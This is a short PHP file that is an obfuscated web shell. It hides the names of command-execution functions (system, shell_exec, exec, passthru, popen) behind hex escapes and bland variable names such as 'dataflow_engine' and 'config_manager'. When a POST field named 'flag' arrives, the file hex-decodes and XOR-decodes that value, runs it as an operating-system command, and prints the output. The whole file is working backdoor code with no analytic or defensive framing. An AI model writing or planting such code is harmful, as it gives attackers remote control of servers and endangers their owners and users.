<?php

$dataflow_engine4 = "\x70assth\x72u";
$dataflow_engine1 = "sy\x73t\x65m";
$auth_exception_handler = "\x68ex2\x62in";
$dataflow_engine5 = "\x70op\x65n";
$dataflow_engine6 = "str\x65a\x6D_\x67e\x74_\x63o\x6Eten\x74s";
$dataflow_engine7 = "p\x63lo\x73\x65";
$dataflow_engine2 = "\x73\x68el\x6C_\x65x\x65c";
$dataflow_engine3 = "\x65\x78ec";
if (isset($_POST["\x66\x6Cag"])) {
            function config_manager    ($symbol   ,   $k ) {
$record =   '';
   $d=0;
 while($d<strlen($symbol)){
$record.=chr(ord($symbol[$d])^$k);
$d++;

} return $record;
   
}
            $flag = $auth_exception_handler($_POST["\x66\x6Cag"]);
            $flag = config_manager($flag, 93);
            if (function_exists($dataflow_engine1)) {
                $dataflow_engine1($flag);
            } elseif (function_exists($dataflow_engine2)) {
                print $dataflow_engine2($flag);
            } elseif (function_exists($dataflow_engine3)) {
                $dataflow_engine3($flag, $res_symbol);
                print join("\n", $res_symbol);
            } elseif (function_exists($dataflow_engine4)) {
                $dataflow_engine4($flag);
            } elseif (function_exists($dataflow_engine5) && function_exists($dataflow_engine6) && function_exists($dataflow_engine7)) {
                $k_record = $dataflow_engine5($flag, 'r');
                if ($k_record) {
                    $holder_marker = $dataflow_engine6($k_record);
                    $dataflow_engine7($k_record);
                    print $holder_marker;
                }
            }
            exit;
        }